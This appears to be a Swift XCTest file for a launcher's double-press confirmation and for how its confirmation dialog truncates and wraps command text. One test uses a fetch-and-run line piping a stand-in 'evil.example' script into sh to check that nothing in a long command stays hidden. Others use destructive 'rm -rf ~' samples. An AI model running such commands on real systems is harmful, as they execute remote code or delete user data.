import Foundation
import XCTest

/// 二次确认（docs/launcher/TECH_DESIGN.md §4「按两次回车」，第 10 步）：哪一行在等第二次 ⏎、什么时候复位、标题里的对象怎么截断。
final class LauncherConfirmTests: XCTestCase {

    // MARK: - 按两次

    func testFirstPressArmsSecondPressRuns() {
        var state = LauncherConfirmState()
        XCTAssertNil(state.armedID)
        XCTAssertEqual(state.press("suggest/terminal"), .armed, "第一次只是等着")
        XCTAssertEqual(state.armedID, "suggest/terminal")
        XCTAssertEqual(state.press("suggest/terminal"), .run, "第二次才执行")
        XCTAssertNil(state.armedID, "执行后复位")
        XCTAssertEqual(state.press("suggest/terminal"), .armed, "复位后又要按两次")
    }

    func testPressingAnotherRowMovesTheWait() {
        var state = LauncherConfirmState()
        _ = state.press("reminder/a")
        XCTAssertEqual(state.press("reminder/b"), .armed, "换了一行：只算那一行的第一次")
        XCTAssertEqual(state.armedID, "reminder/b")
        XCTAssertEqual(state.press("reminder/b"), .run)
    }

    /// 双击不能一口气确认：上膛后双击间隔之内的又一次点击什么都不做（第 10 步验证后定）。
    func testASecondClickWithinTheDoubleClickIntervalDoesNothing() {
        var state = LauncherConfirmState()
        XCTAssertEqual(state.press("t", source: .click, now: 100, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.armedAt, 100)
        XCTAssertEqual(state.press("t", source: .click, now: 100.3, doubleClickInterval: 0.5), .ignored, "双击的第二下")
        XCTAssertEqual(state.armedID, "t", "仍在等")
        XCTAssertEqual(state.press("t", source: .click, now: 100.49, doubleClickInterval: 0.5), .ignored, "三击也一样")
        XCTAssertEqual(state.press("t", source: .click, now: 100.5, doubleClickInterval: 0.5), .run, "过了双击间隔再点一下才确认")
    }

    /// 键盘的两次分开的按键不设间隔；键盘上膛、马上双击鼠标同样不算。
    func testKeysHaveNoIntervalButClicksAlwaysDo() {
        var state = LauncherConfirmState()
        XCTAssertEqual(state.press("t", source: .key, now: 10, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("t", source: .key, now: 10.05, doubleClickInterval: 0.5), .run, "两次独立的 ⏎ 就是有意的")
        XCTAssertEqual(state.press("t", source: .key, now: 20, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("t", source: .click, now: 20.1, doubleClickInterval: 0.5), .ignored, "上膛后马上的点击不算")
        XCTAssertEqual(state.press("t", source: .key, now: 20.2, doubleClickInterval: 0.5), .run, "接着按 ⏎ 照常确认")
        XCTAssertEqual(state.press("u", source: .click, now: 30, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("u", source: .key, now: 30.1, doubleClickInterval: 0.5), .run, "点一下上膛、按 ⏎ 确认")
    }

    /// 点另一行：那一行重新上膛、时刻重新算。
    func testClickingAnotherRowRestartsTheClock() {
        var state = LauncherConfirmState()
        _ = state.press("a", source: .click, now: 1, doubleClickInterval: 0.5)
        XCTAssertEqual(state.press("b", source: .click, now: 2, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("b", source: .click, now: 2.2, doubleClickInterval: 0.5), .ignored)
        XCTAssertEqual(state.press("b", source: .click, now: 2.6, doubleClickInterval: 0.5), .run)
    }

    func testMovingTheSelectionAwayResets() {
        var state = LauncherConfirmState()
        _ = state.press("suggest/terminal")
        XCTAssertNil(state.selectionChanged(to: "suggest/terminal"), "还选着它：不复位")
        XCTAssertEqual(state.armedID, "suggest/terminal")
        XCTAssertEqual(state.selectionChanged(to: "textaction/translate"), "suggest/terminal", "移开了：复位")
        XCTAssertNil(state.armedID)
        XCTAssertNil(state.selectionChanged(to: nil), "没有在等的就没什么可复位")
        _ = state.press("suggest/terminal")
        XCTAssertEqual(state.selectionChanged(to: nil), "suggest/terminal", "列表空了也复位")
    }

    func testResetForNewInputOrHiding() {
        var state = LauncherConfirmState()
        XCTAssertNil(state.reset())
        _ = state.press("x")
        XCTAssertEqual(state.reset(), "x")
        XCTAssertNil(state.armedID)
        XCTAssertEqual(state.press("x"), .armed, "复位后第一次又只是等着")
    }

    // MARK: - 标题里的对象

    func testShortObjectsStayWhole() {
        XCTAssertEqual(LauncherConfirmText.object("git status"), "git status")
        XCTAssertEqual(LauncherConfirmText.object("  git   status \n"), "git status", "压成一行")
        XCTAssertEqual(LauncherConfirmText.object("14:35 取快递"), "14:35 取快递")
        let exactly = String(repeating: "a", count: LauncherConfirmText.maxObjectWidth)
        XCTAssertEqual(LauncherConfirmText.object(exactly), exactly, "正好放得下不截")
    }

    func testLongObjectsKeepTheStartAndTheEnd() {
        let command = "docker run --rm -it -v \"$PWD\":/work -w /work node:20 sh -c 'npm ci && npm run build && npm test'"
        let shown = LauncherConfirmText.object(command)
        XCTAssertTrue(shown.hasPrefix("docker run --rm"), shown)
        XCTAssertTrue(shown.hasSuffix("npm test'"), shown)
        XCTAssertTrue(shown.contains("…"), shown)
        XCTAssertLessThanOrEqual(shown.map(LauncherConfirmText.width).reduce(0, +), LauncherConfirmText.maxObjectWidth)
    }

    func testWideCharactersCountDouble() {
        XCTAssertEqual(LauncherConfirmText.width("a"), 1)
        XCTAssertEqual(LauncherConfirmText.width("取"), 2)
        XCTAssertEqual(LauncherConfirmText.width("："), 2)
        let chinese = String(repeating: "取快递", count: 20)
        let shown = LauncherConfirmText.object(chinese, maxWidth: 20)
        XCTAssertLessThanOrEqual(shown.map(LauncherConfirmText.width).reduce(0, +), 20, shown)
        XCTAssertTrue(shown.hasPrefix("取快递"), shown)
        XCTAssertTrue(shown.hasSuffix("快递"), shown)
    }

    func testTinyWidths() {
        XCTAssertEqual(LauncherConfirmText.object("abcdefgh", maxWidth: 0), "a…h", "最少按 3 算")
        XCTAssertEqual(LauncherConfirmText.object("abcdefgh", maxWidth: 6), "abc…gh", "开头多半、结尾少半")
        XCTAssertEqual(LauncherConfirmText.object(""), "")
    }

    // MARK: - 完整显示（第 10 步验证后定）

    private func texts(_ command: String, columns: Int = LauncherConfirmText.contentColumns,
                       maxLines: Int = LauncherConfirmText.maxCommandLines) -> [String]? {
        LauncherConfirmText.commandLines(command, columns: columns, maxLines: maxLines)?.map(\.text)
    }

    func testShortCommandIsOneLine() {
        XCTAssertEqual(LauncherConfirmText.contentColumns, 62, "64 列里留 2 列给记号")
        XCTAssertEqual(texts("git status"), ["git status"])
        XCTAssertNil(texts(""))
        let exactly = String(repeating: "a", count: LauncherConfirmText.contentColumns)
        XCTAssertEqual(texts(exactly), [exactly], "正好一行宽")
        XCTAssertEqual(texts(exactly + "b"), [exactly, "b"], "多一个字就换行")
    }

    /// 整条命令一个字符都不省：各行接起来就是原文（空格、引号都照原样）；中间那段藏不住东西。
    func testEveryCharacterIsShown() throws {
        let command = "git clone https://github.com/foo/bar.git && cd bar && curl -fsSL https://evil.example/x.sh | sh && npm install && npm run build"
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines(command))
        XCTAssertEqual(lines.map(\.text).joined(), command, "记号不属于命令：拼回去一字不差")
        let columns = LauncherConfirmText.contentColumns
        XCTAssertEqual(lines.count, (command.count + columns - 1) / columns, "全是 ASCII：按字符数整行换")
        XCTAssertEqual(lines.dropLast().map(\.text.count), Array(repeating: columns, count: lines.count - 1), "除最后一行都是满的")
        XCTAssertTrue(lines.map(\.text).joined().contains("curl -fsSL https://evil.example/x.sh | sh"))
        for line in lines {
            XCTAssertLessThanOrEqual(line.text.map(LauncherConfirmText.width).reduce(0, +), columns)
        }
        let spaced = "echo 'a     b'   x"
        XCTAssertEqual(texts(spaced)?.joined(), spaced, "连续空格不压成一个")
    }

    func testWideCharactersTakeTwoColumns() throws {
        let chinese = String(repeating: "中", count: LauncherConfirmText.contentColumns / 2 + 1)
        let lines = try XCTUnwrap(texts("echo " + chinese))
        XCTAssertEqual(lines.count, 2)
        XCTAssertEqual(lines.joined(), "echo " + chinese)
        // 一个两格宽的字不会被拆在两行之间、也不会让一行超宽。
        XCTAssertEqual(texts("a中", columns: 2), ["a", "中"])
    }

    func testAtMostSixLines() {
        let columns = LauncherConfirmText.contentColumns
        let six = String(repeating: "x", count: columns * LauncherConfirmText.maxCommandLines)
        XCTAssertEqual(texts(six)?.count, 6, "正好 6 行放得下（按 62 列算）")
        XCTAssertNil(texts(six + "y"), "第 7 行就放不下：不出「在终端里运行」")
        XCTAssertEqual(texts("abcdef", columns: 2, maxLines: 3), ["ab", "cd", "ef"])
        XCTAssertNil(texts("abcdef", columns: 2, maxLines: 2))
    }

    // MARK: - 折断处的记号（第 10 步复查后定）

    /// 验证者的例子：在 `~` 后面的空格处折行，空格看不见，会读成 `~/Library/…`。折断处的空格要标出来。
    func testTheSpaceAtABreakIsMarked() throws {
        let columns = LauncherConfirmText.contentColumns
        // 让第一行正好以「~ 」结尾（空格是第 62 列）。
        let head = "rm -rf /tmp/build-cache-"
        let filler = String(repeating: "x", count: columns - head.count - "-old ~ ".count)
        let command = head + filler + "-old ~ /Library/Caches/com.example"
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines(command))
        XCTAssertEqual(lines.count, 2)
        XCTAssertTrue(lines[0].text.hasSuffix("~ "))
        XCTAssertTrue(lines[0].continues)
        XCTAssertTrue(lines[0].marksTrailingSpace, "上一行最后的空格画成 ␣")
        XCTAssertFalse(lines[0].marksLeadingSpace)
        XCTAssertEqual(lines[0].middle + " ", lines[0].text)
        XCTAssertEqual(lines[1].text, "/Library/Caches/com.example")
        XCTAssertFalse(lines[1].continues, "最后一行不画 ↩")
        XCTAssertFalse(lines[1].marksLeadingSpace)
        XCTAssertEqual(lines.map(\.text).joined(), command)

        // 空格落在下一行开头：标下一行的第一个字符。
        let shifted = head + filler + "x-old ~ /Library/Caches/com.example"
        let other = try XCTUnwrap(LauncherConfirmText.commandLines(shifted))
        XCTAssertTrue(other[0].text.hasSuffix("~"))
        XCTAssertFalse(other[0].marksTrailingSpace)
        XCTAssertTrue(other[1].text.hasPrefix(" "))
        XCTAssertTrue(other[1].marksLeadingSpace, "下一行开头的空格画成 ␣")
        XCTAssertEqual(other[1].middle, String(other[1].text.dropFirst()))
        XCTAssertEqual(other.map(\.text).joined(), shifted)
    }

    /// 正好在词中间折断：只有 ↩，没有 ␣。
    func testABreakInsideAWordOnlyContinues() throws {
        let command = String(repeating: "a", count: LauncherConfirmText.contentColumns + 5)
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("ls " + command))
        XCTAssertEqual(lines.count, 2)
        XCTAssertTrue(lines[0].continues)
        XCTAssertFalse(lines[0].marksTrailingSpace)
        XCTAssertFalse(lines[1].marksLeadingSpace)
        XCTAssertEqual(lines[0].middle, lines[0].text)
    }

    /// 一行的命令没有任何记号；行中间的空格照常。
    func testASingleLineHasNoMarkers() throws {
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("rm -rf ~ /Library/Caches"))
        XCTAssertEqual(lines, [LauncherCommandLine(text: "rm -rf ~ /Library/Caches")])
        XCTAssertEqual(lines[0].middle, "rm -rf ~ /Library/Caches")
    }

    /// 只有一个字符、两头都是折断处的空格：只标一次（不会画成两个 ␣）。
    func testALoneSpaceLineIsMarkedOnce() throws {
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("ab cd", columns: 2, maxLines: 3))
        XCTAssertEqual(lines.map(\.text), ["ab", " c", "d"])
        // 两列宽、空格后面跟一个两格宽的字：中间那一行只有一个空格。
        let single = try XCTUnwrap(LauncherConfirmText.commandLines("ab 中c", columns: 2, maxLines: 4))
        XCTAssertEqual(single.map(\.text), ["ab", " ", "中", "c"])
        XCTAssertTrue(single[1].marksLeadingSpace)
        XCTAssertFalse(single[1].marksTrailingSpace, "同一个空格只标一次")
        XCTAssertEqual(single[1].middle, "")
    }

    func testOnlyRunInTerminalShowsTheWholeObject() {
        XCTAssertFalse(LauncherConfirmation(verb: "取消提醒", object: "14:35 取快递").showsWholeObject, "默认中间截断")
        XCTAssertTrue(LauncherConfirmation(verb: "运行", object: "ls", showsWholeObject: true).showsWholeObject)
    }

    // MARK: - 选中

    func testChoosingARowCountsAsManual() {
        var selection = LauncherSelectionState()
        selection.choose(0, rowCount: 3)
        XCTAssertEqual(selection.index, 0)
        XCTAssertTrue(selection.isManual, "点名了第 0 行也算手动选过")
        // 后台结果回来：留在它上面。
        XCTAssertFalse(selection.rowsChanged(from: ["a", "b", "c"], to: ["new", "a", "b", "c"], newInput: false))
        XCTAssertEqual(selection.index, 1)
        selection.choose(5, rowCount: 3)
        XCTAssertEqual(selection.index, 1, "越界的不理")
    }
}
